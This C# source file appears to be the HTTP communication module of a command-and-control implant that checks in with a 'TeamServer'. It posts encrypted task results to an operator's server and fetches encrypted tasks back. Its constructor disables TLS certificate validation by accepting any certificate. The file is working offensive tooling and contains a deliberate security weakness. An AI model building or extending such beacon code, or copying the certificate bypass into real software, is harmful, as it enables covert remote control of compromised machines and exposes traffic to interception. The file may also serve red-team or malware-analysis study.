using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Communication
{
    public class HttpCommModule : CommModule
    {
        private HttpClient _client;
        public HttpCommModule(ConnexionUrl conn, string serverKey, IMessageService messManager, IFileService fileService, IProxyService proxyService) : base(conn, serverKey, messManager, fileService, proxyService)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = new
            RemoteCertificateValidationCallback
            (
               delegate
               {
                   return true;
               }
            );

            _client = new HttpClient();
            _client.Timeout = new TimeSpan(0, 0, 10);
            //_client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort
            _client.BaseAddress = new Uri($"{conn}");
            //Console.WriteLine(_client.BaseAddress);
            _client.DefaultRequestHeaders.Clear();

        }

        protected override async Task<List<MessageTask>> CheckIn(List<MessageResult> results)
        {
            var enc = this.Encryptor.EncryptAsBase64(results.Serialize());
            var content = new StringContent(enc);

            var response = await _client.PostAsync($"/", content);

            if (!response.IsSuccessStatusCode)
            {
                System.Diagnostics.Debug.WriteLine($"TeamServer Response error : {response.StatusCode} (Encryption Key can be invalid)."); 
                return new List<MessageTask>();
            }


            var responseContent = await response.Content.ReadAsStringAsync();

            var respDecr = this.Encryptor.DecryptFromBase64(responseContent);

            var json = Encoding.UTF8.GetString(respDecr);
            var resp = respDecr.Deserialize<List<MessageTask>>();
            return resp;
        }


    }
}
